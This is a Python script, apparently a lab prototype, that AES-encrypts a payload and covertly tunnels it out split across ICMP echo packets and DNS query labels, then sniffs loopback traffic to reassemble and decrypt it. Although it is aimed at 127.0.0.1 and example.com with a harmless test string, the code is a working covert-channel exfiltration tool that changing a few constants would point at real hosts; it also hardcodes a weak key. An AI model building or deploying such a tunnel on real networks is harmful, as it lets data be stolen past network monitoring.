import os
import random
import string
import time
import base64
import hashlib
import threading
from scapy.all import IP, ICMP, send, sniff, conf, UDP, DNS, DNSQR
from scapy.packet import Raw
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Configuration
SECRET_KEY = "mysecretkey12345"  # Key for encryption and decryption
received_chunks = {}  # Dictionary to hold received chunks
all_chunks_received = threading.Event()  # Event to signal all chunks are received
stop_sniffer = threading.Event()  # Event to signal the sniffer to stop
dict_lock = threading.Lock()  # Lock for thread-safe access to received_chunks
DOMAIN = "example.com"  # Domain for DNS queries
dns_servers = ["127.0.0.1"]  # Use loopback IP address for testing

# Encryption function
def encrypt_payload(payload):
    key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
    cipher = AES.new(key, AES.MODE_CBC)  # Use AES in CBC mode
    ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
    iv = base64.urlsafe_b64encode(cipher.iv).decode().rstrip('=')
    ct = base64.urlsafe_b64encode(ct_bytes).decode().rstrip('=')
    return f"{iv}:{ct}"

# Decryption function
def decrypt_payload(encrypted_payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
        if ":" not in encrypted_payload:
            raise ValueError("Missing IV and ciphertext separator.")
        iv, ct = encrypted_payload.split(":")
        iv = base64.urlsafe_b64decode(iv + '=' * (-len(iv) % 4))
        ct = base64.urlsafe_b64decode(ct + '=' * (-len(ct) % 4))
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode()
    except ValueError as e:
        raise ValueError(f"Decryption failed due to incorrect data format: {e}")
    except Exception as e:
        raise Exception(f"Decryption failed: {e}")

# Hybrid Payload Sender
def send_hybrid_payload(payload, target_ip, domain=DOMAIN):
    # Encrypt the payload before transmission
    encrypted_payload = encrypt_payload(payload)
    # Encode the entire encrypted payload to base64
    encoded_payload = base64.urlsafe_b64encode(encrypted_payload.encode()).decode().rstrip('=')

    # Split the encoded payload in half for ICMP and DNS transmission
    half_length = len(encoded_payload) // 2
    icmp_payload = encoded_payload[:half_length]
    dns_payload = encoded_payload[half_length:]

    # Send half of the payload via ICMP
    send_icmp_payload(icmp_payload, target_ip)
    # Send half of the payload via DNS
    send_dns_payload(dns_payload, domain)

# ICMP Payload Sender
def send_icmp_payload(payload, target_ip):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    for i, chunk in enumerate(payload_chunks):
        packet = IP(dst=target_ip) / ICMP(type=8, seq=i) / Raw(load=chunk)
        send(packet, verbose=False)
        print(f"[Sender - ICMP] Sent packet with sequence number {i} and chunk: {chunk}")

# DNS Payload Sender
def send_dns_payload(payload, domain):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    for chunk in payload_chunks:
        random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        query_domain = f"{random_label}-{chunk}.{domain}"
        packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
        print(f"[Sender - DNS] Sending DNS query: {query_domain}")
        send(packet, verbose=False)
        time.sleep(random.uniform(0.1, 0.3))  # Reduced delay to speed up transmission

# Packet Sniffer and Reassembler
def packet_sniffer():
    def icmp_sniffer(packet):
        if stop_sniffer.is_set():
            return

        if packet.haslayer(ICMP) and packet.haslayer(Raw):  # Capture all ICMP packets with data
            try:
                payload_data = packet[Raw].load.decode()
                seq_num = packet[ICMP].seq

                # Only process packets with valid sequence numbers
                if seq_num is None:
                    print("[Sniffer - ICMP] Ignored packet with no sequence number.")
                    return

                print(f"[Sniffer - ICMP] ICMP packet received with sequence number {seq_num}")

                with dict_lock:
                    if seq_num not in received_chunks:
                        received_chunks[seq_num] = payload_data
                        print(f"[Sniffer - ICMP] ICMP chunk received: {payload_data}")
                        print(f"[Sniffer - ICMP] Current received chunks: {received_chunks}")

            except Exception as e:
                print(f"[Sniffer - ICMP] Error decoding ICMP packet: {e}")

    def dns_sniffer(packet):
        if packet.haslayer(DNS) and packet.getlayer(DNS).qd is not None:  # Capture only valid DNS query packets
            try:
                query_name = packet.getlayer(DNS).qd.qname.decode().strip('.')

                # Filter packets to only process those with the target domain
                if DOMAIN in query_name:
                    if '-' in query_name:
                        split_query = query_name.split('-')
                        if len(split_query) > 1:
                            data_chunk = split_query[1].split('.')[0]
                            with dict_lock:
                                if data_chunk not in received_chunks.values():  # Avoid duplicates
                                    received_chunks[len(received_chunks)] = data_chunk
                                    print(f"[Sniffer - DNS] DNS chunk received: {data_chunk}")
                                    print(f"[Sniffer - DNS] Current received chunks: {received_chunks}")

            except Exception as e:
                print(f"[Sniffer - DNS] Error decoding DNS packet: {e}")

    # Start sniffing ICMP and DNS packets
    sniff(filter="icmp or udp port 53", prn=lambda pkt: icmp_sniffer(pkt) or dns_sniffer(pkt), store=0, iface="Software Loopback Interface 1", stop_filter=lambda x: stop_sniffer.is_set())

# Run Hybrid Tunneling
if __name__ == "__main__":
    target_ip = "127.0.0.1"
    text_payload = "This is a hardcoded hybrid payload."

    # Start the sniffer thread
    print("[Main] Starting sniffer thread...")
    sniffer_thread = threading.Thread(target=packet_sniffer, daemon=True)
    sniffer_thread.start()

    # Give the sniffer more time to initialize
    time.sleep(2)  # Reduced wait time for sniffer initialization
    print("[Main] Sniffer thread started. Sending hybrid payload...")

    # Send the hybrid payload
    send_hybrid_payload(text_payload, target_ip)

    print("[Main] Payload transmission complete.")

    # Signal the sniffer to stop
    stop_sniffer.set()

    # Attempt to reassemble and decrypt the payload after sending is complete
    with dict_lock:
        if received_chunks:
            try:
                reassembled_payload = ''.join([received_chunks[key] for key in sorted(received_chunks.keys()) if key is not None])
                reassembled_payload_padded = reassembled_payload + '=' * (-len(reassembled_payload) % 4)  # Add padding if needed
                reassembled_text = base64.urlsafe_b64decode(reassembled_payload_padded).decode(errors='ignore')
                decrypted_payload = decrypt_payload(reassembled_text)
                print(f"[Receiver] Final Reassembled and Decrypted Payload: {decrypted_payload}")
            except Exception as e:
                print(f"[Receiver] Error reassembling or decrypting payload: {e}")
        else:
            print("[Receiver] No packets were received.")

    # Wait for the sniffer thread to finish
    sniffer_thread.join(timeout=5)  # Reduced wait time for sniffer thread to complete

    print("[Main] Sniffer thread has been stopped. Exiting program.")
